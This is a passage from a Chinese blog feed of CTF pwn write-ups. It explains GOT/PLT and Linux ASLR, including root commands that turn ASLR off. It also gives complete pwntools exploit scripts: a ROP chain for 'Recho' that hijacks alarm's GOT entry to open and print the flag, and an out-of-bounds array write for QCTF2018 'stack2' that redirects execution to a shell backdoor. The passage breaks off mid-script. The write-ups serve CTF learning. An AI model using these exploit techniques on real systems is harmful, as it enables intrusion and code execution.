Table）全局偏移表。这是链接器为外部符号填充的实际偏移表，里面存放的是外部符号的绝对地址，你会发现在 64 位程序中，这个表中表项的大小都是 8 个字节。</li><li><strong><code>.plt</code></strong><br>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到外部符号的地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时（第一次使用此外部符号），触发其首部的解析函数去找到所需地址。</li><li><strong><code>.got.plt</code></strong><br>这个节是 GOT 的一部分，其中各表项存放了<code>.plt</code> 节所需要的外部符号的地址。另外，<code>.got.plt</code> 节还有一个特殊的地方是它的前三项是由特殊意义的。如图：<br><img src="3.png"></li></ul><blockquote><p>【注】：<code>.plt</code> 中存放的是代码，<code>.got</code>中存放的是数据</p></blockquote><p>下面通过图示展示调用外部函数的过程：<br><img src="4.png"></p><p><img src="5.png"></p><p><font color='red'><strong>通过以上分析，发现如果 .plt 有我们所需要的外部函数表项，不管是第一次调用还是第几次调用，最终都会跳转到真正的函数处执行，所以我们需要利用某个函数的时候，只需要直接填入其在 .plt 段中对应的地址</strong>。</font></p><hr><h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec，仅仅有栈不可执行保护。</p><div align=center><img src="6.png" width=65%></div><p>丢到 IDA 中逆向：<br><img src="7.png"></p><ul><li>程序的大概意思就是读取一个长度，然后再读入该长度数量的字节数据存入 buf 数组， 如果该长度小于 16，就读入 16 个字节的数据存入 buf 数组，并且会在数据的末尾添加上 <code>&#39;\0&#39;</code>。</li><li>很明显的漏洞，因为 v7 没有长度限制，所以可以通过 read 函数实现栈溢出。但是这个题有一个 while 循环，由于 read 函数只有在读到 EOF 的时候才会返回 0，如果是在本地终端，可以通过 Crtl+D 来结束循环，但是远程并不能这样。<strong>好在 pwntool 中存在一个 shutdown 函数可以关闭 IO，这样通过调用 shutdown 就可以结束 while 循环。又由于关闭 IO 后我们无法与远程继续交互，所以我们必须一次性构造好 ROP 链，实现漏洞的利用。</strong></li><li>同时由于在样本中有发现 “flag” 字符串，猜测是否提示我们打开 flag 文件，因此联想到使用系统调用来实现。</li><li>这样基本思路就是通过 <strong>open 系统调用</strong>来打开 flag 文件，然后由于程序中本来就调用过 read 函数和 printf 函数，所以可以通过构造以下的代码段来获取 flag。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY)</span><br><span class="line">read(fd, bss+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line"><span class="built_in">printf</span>(bss_addr+<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><h2 id="GDB-调试获取-syscall-地址"><a href="#GDB-调试获取-syscall-地址" class="headerlink" title="GDB 调试获取 syscall 地址"></a>GDB 调试获取 syscall 地址</h2><p><strong>现在问题是我们怎么获得 syscall 的地址，其实在一般的类似于 alarm、read、write 函数的实现中，都会调用 syscall 函数</strong>。基于这个认识，我们进行动态调试，可以发现在 alarm 函数中，syscall 对于 alarm 函数的偏移是 <font color='red'>0x5</font>。</p><div align=center><img src="8.png" width=85%></div><p>这样我们的思路就清晰了，只要先通过改写 GOT 表中 alarm 表项的地址为 syscall 的地址，然后再进行上述三句代码的构造，形成 ROP 链，便可以获得 flag。</p><h2 id="链构造"><a href="#链构造" class="headerlink" title="链构造"></a>链构造</h2><p>通过 ROPgadget 可以发现我们进行函数传参所需要的 gadget，如下图所示：<br><img src="9.png"></p><p>还需要一个修改 alarm 的 GOT 表项地址，需要给其加上一个 0x5，也发现了可用的 gadget。如图：<br><img src="10.png"></p><p>接下来构造 ROP 链：</p><ul><li>首先要修改 alarm 的 GOT 表项的地址，将其改为 syscall 的地址，因为程序之前有调用过他，故 GOT 表中填入了其真实的地址，那么我们只需要将其加上 <strong>0x5</strong> 即可。</li><li>然后在再构造 open 函数的时候需要注意的是 Linux 规定的 O_RDONLY 宏等于 <strong>0</strong> ，同时，一般来讲进程打开的第一个文件的文件描述符是 <strong>3</strong>（0，1，2 已经分别被标准输入、标准输出、标准错误所占用）。</li><li>对于 read 函数的构造，我们选择把读入的字符串存放在 <strong>bss+0x100</strong> 的位置，通过 <code>vmmap</code> 可以看到该内存区域是可读可写的。<br><img src="11.png"></li></ul><ul><li>printf 函数的构造就比较简单了。</li></ul><p>最后构造出的 ROP 链如下：<br><img src="12.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">p = process(<span class="string">&#x27;./Recho&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">48052</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Recho&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_plt = elf.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x601058</span></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x4006fc</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x4008a1</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4006fe</span></span><br><span class="line">add_rdi_al_ret = <span class="number">0x40070d</span></span><br><span class="line">syscall_offset = <span class="number">0x5</span></span><br><span class="line"></span><br><span class="line">n_sys_open = <span class="number">0x2</span></span><br><span class="line">O_RDONLY = <span class="number">0x0</span></span><br><span class="line">fd = <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hajack .plt.got(alarm)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(alarm_got) +p64(pop_rax_ret) + p64(syscall_offset) + p64(add_rdi_al_ret)</span><br><span class="line"><span class="comment"># open(&quot;flag&quot;, O_RDONLY)</span></span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret) + p64(O_RDONLY) + <span class="string">b&#x27;deadbeef&#x27;</span> + p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rax_ret) + p64(n_sys_open) + p64(alarm_plt)</span><br><span class="line"><span class="comment"># read(fd, bss_addr+0x100, 0x50)</span></span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(pop_rsi_pop_r15_ret) + p64(bss_addr+<span class="number">0x100</span>) + <span class="string">b&#x27;deadbeef&#x27;</span> + p64(pop_rdi_ret) + p64(fd) + p64(read_plt)    </span><br><span class="line"><span class="comment"># printf(bss_addr+0x100)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr+<span class="number">0x100</span>) + p64(printf_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;elcome to Recho server!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x200</span>)) </span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.shutdown()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.jianshu.com/p/5092d6d5caa3">https://www.jianshu.com/p/5092d6d5caa3</a></p><p><a href="https://github.com/torvalds/linux/tree/master/arch/x86/entry/syscalls">Linux 系统调用号表</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层技术 </tag>
            
            <tag> Linux </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【QCTF2018】stack2------＜ASLR保护机制＞</title>
      <link href="/2021/10/19/pwn-stack2/"/>
      <url>/2021/10/19/pwn-stack2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在最简单的栈溢出中，如果程序中存在获取 shell 的后门函数，则只需要简单的通过溢出手段将函数的返回地址修改为后门函数的地址，便可以轻松获取 shell。而对于没有提供后门函数的程序，可以通过往栈里面写入 shellcode，在返回的时候将控制流劫持到栈里面的 shellcode 获取 shell。但是对于加入 NX 保护的程序，在栈中写入 shellcode 的方法则不再适用，而 ROP 就是其中一种绕过保护的手段。<strong>ROP</strong> 的全称为 Return-oriented programming（返回导向编程），其核心思想是<strong>利用以 ret 结尾的指令序列把栈中的应该返回 EIP 的地址更改成我们需要的值，从而控制程序的执行流程</strong>。</p><hr><h1 id="知识点详解"><a href="#知识点详解" class="headerlink" title="知识点详解"></a>知识点详解</h1><h2 id="ASLR保护机制"><a href="#ASLR保护机制" class="headerlink" title="ASLR保护机制"></a>ASLR保护机制</h2><blockquote><p>ASLR，全称为 Address Space Layout Randomization，地址空间布局随机化。ASLR 技术在 2005 年的 kernel 2.6.12 中被引入到 Linux 系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前 Linux、Windows 等主流操作系统都已经采用该项技术。</p></blockquote><p>在 Linux 平台上，ASLR 分为了 0，1，2 三级，通过一个内核参数 <strong>randomize_va_space</strong> 进行控制。对应的含义如下：</p><ul><li>/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR。</li><li>/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在 randomize_va_space = 1 的基础上，通过 brk() 分配的内存空间也将被随机化（一般在 pwn 的环境中，ASLR 是开满的）。</li></ul><p>通过以下命令可以查看系统当前的ASLR等级：</p><p><code>$ cat /proc/sys/kernel/randomize_va_space</code></p><p>在<strong>root权限</strong>的shell中，可以通过以下指令修改ASLR：</p><p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><code>echo 1 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><code>echo 2 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><font color='blue'><strong>下面通过一段程序来测试 ASLR</strong></font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// aslr.c</span></span><br><span class="line"><span class="comment">// environment：Ubuntu 18.04</span></span><br><span class="line"><span class="comment">// gcc version: 7.5.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> globalVar = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> uninitGlobalVar;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> localVar = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The address of func() is %p, in .text section\n&quot;</span>, func);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The address of globalVar is %p, in .data section\n&quot;</span>, &amp;globalVar);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The address of uninitGlobalVar is %p, in .bss section\n&quot;</span>, &amp;uninitGlobalVar);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The address of localVar is %p, in stack\n&quot;</span>, &amp;localVar);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别利用命令 <code>gcc -no-pie aslr.c -o aslr64</code> 和 <code>gcc -m32 -no-pie aslr.c -o aslr32</code> 生成 64 位和 32 位的可执行程序，在 ASLR 保护等级为 2 的系统下运行四次：<br><img src="1.png"></p><p><img src="2.png"></p><p>通过运行程序可以发现无论是 64 位的程序还是 32 位的程序，每一次执行，程序装载到内存后，其代码段和数据段的地址始终是相同的，可见 <strong>ASLR 并不会随机化代码段和数据段</strong>。但是对于存放在函数调用栈中的局部变量 localVar，每一次执行其地址都不同，可见 <strong>ASLR 随机化了栈的地址</strong>。<font color='red'>更细心可以发现，即使四次执行栈的地址被随机化了，但是其低 4 位始终是同一个值 8，可见栈的随机化是对<strong>低 4 位对齐</strong>的。</font>同样可以通过 <code>ldd</code> 命令查看程序加载动态库的地址，会发现其同样被随机化了，但是对<strong>低 12 位对齐</strong>（所谓页面的 4K 对齐？？）。<br>事实上，Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作，而不是 ASLR。要开启 PIE，在使用 gcc 进行编译链接时添加 -fpie -pie 选项即可（gcc 是默认打开 PIE 保护的）。但是只有在开启 ASLR 之后，PIE 才会生效。</p><hr><h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><p>先用 <strong>file</strong> 查看文件的属性，可以看出 stack2 是 <strong>32 位的 ELF 可执行文件</strong>：<br><img src="3.png"></p><p>再用 <strong>checksec</strong> 查看文件的保护机制，打开 <strong>canary 保护</strong>和 <strong>NX 栈不可执行</strong>保护：<br><img src="4.png"></p><p>初步运行一下程序：<br><img src="5.png"></p><p>大概意思就是给你创建了一个数据结构存放你希望存放的一些数字。并提供对这些数字的一些操作，包括打印，添加，改变，算平均值。同时根据 IDA 进行静态分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显的发现在第 66 行中的 <code>v13[v5] = v7</code> 这句代码存在溢出漏洞，因为在给数组写值的时候，没有检查数组边界。同时在 IDA 的函数窗口中发现有<strong>后门函数 hackhere</strong>：</p><div align=center><img src="6.png" width=65%></div><p>这样思路就很清晰了，我们只需要通过数组溢出来实现对返回地址的改写，即可获得 shell。首先跳转到 <code>v13[i]=v7</code> 处的汇编代码，进行分析，如下：<br><img src="7.png"></p><p>从这里可以得出关键的信息，v13 距离 ebp 的偏移是 <strong>0x70</strong>。按照往常的思维，v13 到返回地址的偏移应就是 <strong>0x70+0x04</strong> 了，但是，当我将该处写入后门函数的地址时候，并没有理所应当的拿到 shell。经过再次分析，看到 main 函数的函数开始处：<br><img src="8.png"></p><p>果然有猫腻，main 函数开辟栈帧并没有用常见的 <strong>PUSH EBP;&emsp;MOV EBP ESP; &emsp;SUB ESP OFFSET</strong> 的方式来开辟栈帧，这样的话返回地址就并没有存放在 ebp 的上面。由于有 ASLR 的栈基址随机化保护，那么每次栈的基址不同，那 <code>and esp, 0FFFFFFF0h</code> 是不是会导致每次程序执行有不同的偏移呢？并不是，因为在上面的 ASLR 保护机制处我们已经分析发现了，虽然 ASLR 会使得栈的基址随机化，但是其<font color='red'><strong>低四位仍然是固定的</strong></font>，那么尽管 main 函数采用上述的开辟栈帧的方式，程序每次加载，<strong>main 函数栈帧的 ebp 指针到返回地址的偏移仍然是固定的，且等于 esp 的低四位表示的字节数 +4 字节 +4 字节</strong>。这样就可以在 gdb 中动态调试，查看 esp 的低四位，在 main 函数的入口处打断点，此时 esp 指向的是返回地址，且其低四位为 <strong>0xC</strong>：<br><img src="9.png"></p><p>这样可以得到 mian 函数栈帧的 ebp 到返回地址的偏移为：<font color=;red><strong>0xC+0x4+0x4 =0x14</strong></font>。因此得出 v13 到返回地址的偏移为：<font color=;red><strong>0x14+0x70 = 0x84</strong></font>。如下图所示：<br><img src="10.png"></p><p>OK，基本思路已经可以了，写 exp 脚本：<br><img src="11.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048980</span></span><br><span class="line">addr_offset = <span class="number">0x84</span></span><br><span class="line">call_system_addr = <span class="number">0x080485B4</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_v13</span>(<span class="params">offset, num</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">r.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change the return address to the address of the system func</span></span><br><span class="line">write_v13(addr_offset, <span class="number">0xb4</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">1</span>, <span class="number">0x85</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write system func par</span></span><br><span class="line">write_v13(addr_offset+<span class="number">4</span>, <span class="number">0x80</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">5</span>, <span class="number">0x89</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">6</span>, <span class="number">0x04</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">7</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span 